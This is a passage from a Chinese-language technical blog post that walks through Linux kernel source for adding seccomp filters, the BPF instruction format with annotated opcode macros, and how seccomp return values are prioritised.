<p>对于自定义规则而言，添加的过程要复杂许多。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">seccomp_set_mode_filter</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">				    <span class="type">const</span> <span class="type">char</span> __user *filter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> seccomp_mode = SECCOMP_MODE_FILTER;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">prepared</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">long</span> ret = -EINVAL;</span><br><span class="line">	<span class="type">int</span> listener = <span class="number">-1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">listener_f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Validate flags. */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~SECCOMP_FILTER_FLAG_MASK)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * In the successful case, NEW_LISTENER returns the new listener fd.</span></span><br><span class="line"><span class="comment">	 * But in the failure case, TSYNC returns the thread that died. If you</span></span><br><span class="line"><span class="comment">	 * combine these two flags, there&#x27;s no way to tell whether something</span></span><br><span class="line"><span class="comment">	 * succeeded or failed. So, let&#x27;s disallow this combination if the user</span></span><br><span class="line"><span class="comment">	 * has not explicitly requested no errors from TSYNC.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SECCOMP_FILTER_FLAG_TSYNC) &amp;&amp;</span><br><span class="line">	    (flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) &amp;&amp;</span><br><span class="line">	    ((flags &amp; SECCOMP_FILTER_FLAG_TSYNC_ESRCH) == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The SECCOMP_FILTER_FLAG_WAIT_KILLABLE_SENT flag doesn&#x27;t make sense</span></span><br><span class="line"><span class="comment">	 * without the SECCOMP_FILTER_FLAG_NEW_LISTENER flag.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SECCOMP_FILTER_FLAG_WAIT_KILLABLE_RECV) &amp;&amp;</span><br><span class="line">	    ((flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Prepare the new filter before holding any locks. */</span></span><br><span class="line">	prepared = seccomp_prepare_user_filter(filter);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(prepared))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(prepared);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) &#123;</span><br><span class="line">		listener = get_unused_fd_flags(O_CLOEXEC);</span><br><span class="line">		<span class="keyword">if</span> (listener &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			ret = listener;</span><br><span class="line">			<span class="keyword">goto</span> out_free;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		listener_f = init_listener(prepared);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(listener_f)) &#123;</span><br><span class="line">			put_unused_fd(listener);</span><br><span class="line">			ret = PTR_ERR(listener_f);</span><br><span class="line">			<span class="keyword">goto</span> out_free;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Make sure we cannot change seccomp or nnp state via TSYNC</span></span><br><span class="line"><span class="comment">	 * while another thread is in the middle of calling exec.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_TSYNC &amp;&amp;</span><br><span class="line">	    mutex_lock_killable(&amp;current-&gt;signal-&gt;cred_guard_mutex))</span><br><span class="line">		<span class="keyword">goto</span> out_put_fd;</span><br><span class="line"></span><br><span class="line">	spin_lock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!seccomp_may_assign_mode(seccomp_mode))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (has_duplicate_listener(prepared)) &#123;</span><br><span class="line">		ret = -EBUSY;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = seccomp_attach_filter(flags, prepared);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">/* Do not free the successfully attached filter. */</span></span><br><span class="line">	prepared = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	seccomp_assign_mode(current, seccomp_mode, flags);</span><br><span class="line">out:</span><br><span class="line">	spin_unlock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_TSYNC)</span><br><span class="line">		mutex_unlock(&amp;current-&gt;signal-&gt;cred_guard_mutex);</span><br><span class="line">out_put_fd:</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">			listener_f-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">			fput(listener_f);</span><br><span class="line">			put_unused_fd(listener);</span><br><span class="line">			seccomp_notify_detach(prepared);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fd_install(listener, listener_f);</span><br><span class="line">			ret = listener;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">out_free:</span><br><span class="line">	seccomp_filter_free(prepared);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数中有很多的判断条件，当这些判断条件不满足时，会直接返回一个错误值。需要注意的是<code>flags &amp; ~SECCOMP_FILTER_FLAG_MASK = 0</code>，也就是<code>flags</code>除了最低6位其他位必须全为0。</p>
<p>通过3个判断之后，调用了<code>seccomp_prepare_user_filter</code>函数初始化<code>struct seccomp_filter</code>结构体实例。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> &#123;</span></span><br><span class="line">	<span class="type">refcount_t</span> refs;</span><br><span class="line">	<span class="type">refcount_t</span> users;</span><br><span class="line">	<span class="type">bool</span> <span class="built_in">log</span>;</span><br><span class="line">	<span class="type">bool</span> wait_killable_recv;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">action_cache</span> <span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">prev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">notification</span> *<span class="title">notif</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">notify_lock</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> wqh;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> seccomp_filter *</span><br><span class="line"><span class="title function_">seccomp_prepare_user_filter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> __user *user_filter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">fprog</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">filter</span> =</span> ERR_PTR(-EFAULT);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">	<span class="keyword">if</span> (in_compat_syscall()) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">compat_sock_fprog</span> <span class="title">fprog32</span>;</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(&amp;fprog32, user_filter, <span class="keyword">sizeof</span>(fprog32)))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		fprog.len = fprog32.len;</span><br><span class="line">		fprog.filter = compat_ptr(fprog32.filter);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="comment">/* falls through to the if below. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;fprog, user_filter, <span class="keyword">sizeof</span>(fprog)))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	filter = seccomp_prepare_filter(&amp;fprog);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span>	<span class="comment">/* Required for SO_ATTACH_FILTER. */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>		len;	<span class="comment">/* Number of filter blocks */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> __<span class="title">user</span> *<span class="title">filter</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>	<span class="comment">/* Filter block */</span></span><br><span class="line">	__u16	code;   <span class="comment">/* Actual filter code */</span></span><br><span class="line">	__u8	jt;	<span class="comment">/* Jump true */</span></span><br><span class="line">	__u8	jf;	<span class="comment">/* Jump false */</span></span><br><span class="line">	__u32	k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>从上面的结构体定义和函数定义可以看出，我们传入的用户态指针需要是<code>sock_fprog</code>结构体实例，Linux中定义了一个seccomp规则的最大长度为4096，即len必须位于(0,4096]，上面的<code>sock_filter</code>可以理解为seccomp沙箱的一条“指令”。在<code>seccomp_prepare_user_filter</code>中也有一些检查，通过返回值我们就可以知道是针对什么的检查，后面两个是<code>EACCES</code>和<code>ENOMEM</code>，一个是权限相关，一个是内存不够，一般都不会发生。随后就是将用户传递的过滤器中的内容保存到<code>seccomp_filter</code>实例中返回。</p>
<p>初始化<code>seccomp_filter</code>完成后，我们先略过后面对一些flags的特殊处理，判断了一下是否能够加载规则，随后调用了<code>seccomp_attach_filter</code>，主要是处理已有的flags，随后将新的filter规则添加到头部的位置，使用<code>prev</code>属性连接成一个单链表，如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">seccomp_attach_filter</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> seccomp_filter *filter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> total_insns;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">walker</span>;</span></span><br><span class="line"></span><br><span class="line">	assert_spin_locked(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Validate resulting filter length. */</span></span><br><span class="line">	total_insns = filter-&gt;prog-&gt;len;</span><br><span class="line">	<span class="keyword">for</span> (walker = current-&gt;seccomp.filter; walker; walker = walker-&gt;prev)</span><br><span class="line">		total_insns += walker-&gt;prog-&gt;len + <span class="number">4</span>;  <span class="comment">/* 4 instr penalty */</span></span><br><span class="line">	<span class="keyword">if</span> (total_insns &gt; MAX_INSNS_PER_PATH)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If there is an existing filter, make it the prev and don&#x27;t drop its</span></span><br><span class="line"><span class="comment">	 * task reference.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	filter-&gt;prev = current-&gt;seccomp.filter;</span><br><span class="line">	seccomp_cache_prepare(filter);</span><br><span class="line">	current-&gt;seccomp.filter = filter;</span><br><span class="line">	<span class="type">atomic_inc</span>(&amp;current-&gt;seccomp.filter_count);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now that the new filter is in place, synchronize to all threads. */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_TSYNC)</span><br><span class="line">		seccomp_sync_threads(flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上就是过滤器添加的大致流程。</p>
<h1 id="0x02-seccomp沙箱指令格式"><a class="markdownIt-Anchor" href="#0x02-seccomp沙箱指令格式"></a> 0x02. seccomp沙箱“指令”格式</h1>
<p>seccomp沙箱的每一条指令的长度都是8字节，分为4个字段——code、jt、jf、k。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>	<span class="comment">/* Filter block */</span></span><br><span class="line">	__u16	code;   <span class="comment">/* Actual filter code */</span></span><br><span class="line">	__u8	jt;	<span class="comment">/* Jump true */</span></span><br><span class="line">	__u8	jf;	<span class="comment">/* Jump false */</span></span><br><span class="line">	__u32	k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在Linux中定义了一些方便编写seccomp code的宏定义（code含义定义在 <code>/include/uapi/linux/bpf_common.h</code> 中），这里引用<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273495.htm#msg_header_h1_2">资料</a>中的注释便于理解：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STMT(code, k) &#123; (unsigned short)(code), 0, 0, k &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JUMP(code, k, jt, jf) &#123; (unsigned short)(code), jt, jf, k &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Instruction classes */</span>                    </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)    <span class="comment">//指定操作的类别</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LD        0x00               <span class="comment">//将值复制到累加器中</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LDX        0x01               <span class="comment">//将值加载到索引寄存器中</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ST        0x02               <span class="comment">//将累加器中的值存到暂存器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_STX        0x03               <span class="comment">//将索引寄存器的值存储在暂存器中</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ALU        0x04               <span class="comment">//用索引寄存器或常数作为操作数在累加器上执行算数或逻辑运算</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JMP        0x05               <span class="comment">//跳转</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_RET        0x06               <span class="comment">//返回</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MISC        0x07           <span class="comment">// 其他类别</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* ld/ldx fields */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_W        0x00 <span class="comment">/* 32-bit */</span>       <span class="comment">//字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_H        0x08 <span class="comment">/* 16-bit */</span>       <span class="comment">//半字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_B        0x10 <span class="comment">/*  8-bit */</span>       <span class="comment">//字节</span></span></span><br><span class="line"><span class="comment">/* eBPF        BPF_DW        0x18    64-bit */</span>       <span class="comment">//双字</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_IMM        0x00                  <span class="comment">//常数 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ABS        0x20                  <span class="comment">//固定偏移量的数据包数据(绝对偏移)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_IND        0x40                  <span class="comment">//可变偏移量的数据包数据(相对偏移)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MEM        0x60                  <span class="comment">//暂存器中的一个字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LEN        0x80                  <span class="comment">//数据包长度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MSH        0xa0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* alu/jmp fields */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)       <span class="comment">//当操作码类型为ALU时，指定具体运算符   </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ADD        0x00        </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_SUB        0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MUL        0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_DIV        0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_OR        0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_AND        0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LSH        0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_RSH        0x70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_NEG        0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MOD        0x90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_XOR        0xa0</span></span><br><span class="line">                                               <span class="comment">//当操作码是jmp时指定跳转类型</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JA        0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JEQ        0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JGT        0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JGE        0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JSET        0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_K        0x00                    <span class="comment">//常数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_X        0x08                    <span class="comment">//索引寄存器</span></span></span><br></pre></td></tr></table></figure>
<p>在笔者查资料的时候，发现这个BPF不仅能用来编写seccomp规则，它更像是一个较为成熟的汇编语言+胶水语言，并在2014年就拥有了自己的执行引擎eBPF。这又是一个完全的知识体系。</p>
<p>网络上针对BPF大多是通过C等进行编译获得BPF代码，但对于seccomp而言，我们要做的是直接编写BPF code。但专用于seccomp的BPF除了通用的BPF语法之外，还有一些额外的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * All BPF programs must return a 32-bit value.</span></span><br><span class="line"><span class="comment"> * The bottom 16-bits are for optional return data.</span></span><br><span class="line"><span class="comment"> * The upper 16-bits are ordered from least permissive values to most,</span></span><br><span class="line"><span class="comment"> * as a signed value (so 0x8000000 is negative).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The ordering ensures that a min_t() over composed return values always</span></span><br><span class="line"><span class="comment"> * selects the least permissive choice.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL_PROCESS 0x80000000U <span class="comment">/* kill the process */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL_THREAD	 0x00000000U <span class="comment">/* kill the thread */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL	 SECCOMP_RET_KILL_THREAD</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_TRAP	 0x00030000U <span class="comment">/* disallow and force a SIGSYS */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ERRNO	 0x00050000U <span class="comment">/* returns an errno */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_USER_NOTIF	 0x7fc00000U <span class="comment">/* notifies userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_TRACE	 0x7ff00000U <span class="comment">/* pass to a tracer or disallow */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_LOG		 0x7ffc0000U <span class="comment">/* allow after logging */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ALLOW	 0x7fff0000U <span class="comment">/* allow */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Masks for the return value sections. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ACTION_FULL	0xffff0000U</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ACTION	0x7fff0000U</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_DATA	0x0000ffffU</span></span><br></pre></td></tr></table></figure>
<p>上面定义了seccomp BPF的返回值，从注释可知，返回值的低16bit用于传递其他数据，高16bit用于传递返回值的优先级。当一个系统调用匹配了多个seccomp规则时，会优先使用优先级高的返回值，这里从<code>SECCOMP_RET_KILL_PROCESS</code>的优先级最高，<code>SECCOMP_RET_ALLOW</code>最低，如果一个系统调用匹配了两个规则，返回值分别为<code>SECCOMP_RET_KILL</code>和<code>SECCOMP_RET_ALLOW</code>，那么最终将会选择<code>SECCOMP_RET_KILL</code>作为返回值，即杀死触发这个系统调用的线程。</p>
